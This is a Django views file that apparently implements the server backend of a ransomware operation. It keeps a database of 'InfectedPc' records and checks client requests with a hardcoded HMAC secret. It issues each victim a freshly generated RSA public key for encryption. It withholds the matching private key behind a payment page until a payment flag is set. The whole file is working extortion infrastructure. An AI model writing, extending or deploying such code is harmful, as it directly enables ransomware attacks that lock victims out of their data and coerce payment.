from rest_framework import generics
from .models import InfectedPc
from .serializers import InfectedPcSerializer
from django.http import HttpResponseRedirect, HttpResponse
from base64 import b64encode
import os
from rest_framework import generics
from rest_framework import permissions
from rest_framework.response import Response
from rest_framework.views import status
from django.shortcuts import render
from .forms import decryptForm
from rest_framework.decorators import api_view, renderer_classes
from ratelimit.decorators import ratelimit
from Crypto.PublicKey import RSA
from datetime import datetime
import hashlib
import hmac 


class ListInfectedPcView(generics.ListAPIView):
    """
    Provides a get method handler.
    """
    queryset = InfectedPc.objects.all()
    serializer_class = InfectedPcSerializer
    permission_classes = (permissions.IsAuthenticated,)
@ratelimit(key='ip')
@ratelimit(key='post:uniqueId', rate='5/m')
@api_view(('POST','GET'))
def encrypt(request):
    if request.method == 'POST':
        if 'uniqueId' in request.data and 'hMac' in request.data:
            now = datetime.now()
            date = now.strftime('%Y-%m-%d')
            messageServer = bytes(date, 'utf-8')
            secretKey = bytes("IyT87LzSAwq3kBwQ", 'utf-8')
            hmacServer  = hmac.new(secretKey, messageServer, hashlib.sha512).hexdigest()
            hmacClient = request.data['hMac']
            hmacValid = hmac.compare_digest(hmacServer, hmacClient)
            print(hmacValid)
            if not hmacValid:
                return Response(
                    data="hmac invalid",
                    status=status.HTTP_405_METHOD_NOT_ALLOWED
                )
            if not InfectedPc.objects.filter(uniqueId = request.data['uniqueId']).exists():
                key = RSA.generate(2048)
                privateKey = key.export_key(pkcs=8)
                publicKey = key.publickey().export_key()
                InfectedPc.objects.create(
                    uniqueId=request.data['uniqueId'],
                    privateKey=privateKey,
                    publicKey=publicKey,
                )
                return Response(
                    data={'publicKey': publicKey},
                    status=status.HTTP_201_CREATED
                )
            else:
                return Response(
                    data="InfectedPC already existing",
                    status=status.HTTP_200_OK
                )
        else:
            return Response(
                data="No uniqueId provided or hmac missing",
                status=status.HTTP_405_METHOD_NOT_ALLOWED
            )        
    else:
        return Response(
                data="Method not supported",
                status=status.HTTP_405_METHOD_NOT_ALLOWED
            )

def decrypt(request):
    # if this is a POST request we need to process the form data
    if request.method == 'POST':
        # create a form instance and populate it with data from the request:
        form = decryptForm(request.POST)
        # check whether it's valid:
        if form.is_valid():
            uniqueId = form.cleaned_data['uniqueId']
            infectedPcObject = InfectedPc.objects.filter(uniqueId=uniqueId).last()
            exists = InfectedPc.objects.filter(uniqueId=uniqueId).exists()
            if exists == True:
                paymentStatus = infectedPcObject.paymentStatus
                if paymentStatus == False:
                    return render(request, 'payment.html', {'uniqueId': uniqueId})
                if paymentStatus == True:
                    privateKeyHtml = infectedPcObject.privateKey.replace('\\n', ' \n ').replace("b\'", "").replace("-----\'", "-----")
                    return render(request, 'paid.html', {'privateKey': privateKeyHtml})
            else:
                return HttpResponse("<h1>uniqueId does not exist in this database, please try again <a href=/decrypt>here</a></h1>")
    else:
        form = decryptForm()

    return render(request, 'decrypt.html', {'form': form})
def index(request):
    return render(request, 'index.html')
    

